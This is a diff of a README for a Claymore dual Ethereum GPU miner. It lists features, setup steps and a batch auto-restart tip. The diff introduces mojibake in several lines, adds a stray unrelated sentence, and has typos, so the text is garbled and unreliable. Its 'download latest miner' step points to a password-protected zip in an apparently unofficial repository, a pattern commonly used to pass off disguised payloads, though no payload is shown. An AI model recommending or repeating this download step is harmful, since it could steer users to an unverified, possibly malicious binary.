@@ -18,6 +18,7 @@
 </p>
 
 # Claymore's Dual Ethereum AMD+NVIDIA GPU Miner v12.0 (Windows/Linux)
+We put our souls openly into out works.
 <p>Claymore Miner is high performance Ethereum (ETH) and ERC20 tokens  miner, with the official full Windows / Linux support.
 </p>
 <p align="center">
@@ -46,7 +47,7 @@
 * Supports Nvidia 10x0 and 9x0 series as well as older cards with enough VRAM
 * Optional "green" kernels for RX580/570/560/480/470/460 to lower the power consumption by 2-3% with small, or no drop in hashrate
 * Lowest developer fee of 1% (35 seconds defvee mining per each 90 minutes)
-* Dual mining 💰
+* Dual mining ðŸ’°
 * Advanced statistics: actual difficulty of each share, effective hashrate at the pool, and optional showing of estimated income in USD
 * DAG file generation in the GPU for faster start-up and DAG epoch switches
 * Supports all ethash mining pools and stratum protocols
@@ -72,11 +73,11 @@
   
 ## How to use
 
-<li>Step 1 – Install your GPUs and set up your computer</li>
-<li>Step 2 – <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v12.0/Claymore.s.dual.ethereum.miner.-.widows.Password-claymore.zip">Download latest claymore miner</a></li>
-<li>Step 3 – Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
-<li>Step 4 – Join a <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/wiki/ETH-Mining-Pools-List-(updated-2019)">mining pool</a></li>
-<li>Step 5 – Start mining!</li>
+<li>Step 1 â€“ Install your GPUs and set up your computer</li>
+<li>Step 2 â€“ <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v12.0/Claymore.s.dual.ethereum.miner.-.widows.Password-claymore.zip">Download latest claymore miner</a></li>
+<li>Step 3 â€“ Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
+<li>Step 4 â€“ Join a <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/wiki/ETH-Mining-Pools-List-(updated-2019)">mining pool</a></li>
+<li>Step 5 â€“ Start mining!</li>
 
 ## Example
 
@@ -105,9 +106,9 @@ pause
 
 ###
 
-## Claymore Miner�Auto Restart 
+## Claymore Miner Auto Restart 
 
-In Windows if you�ve  configured your miner through a batch file then you can easily make the script to loop with this simple command.
+In Windows if you’ve  configured your miner through a batch file then you can easily make the script to loop with this simple command.
 ```batch
 your miner configuration goes here
 goto start`
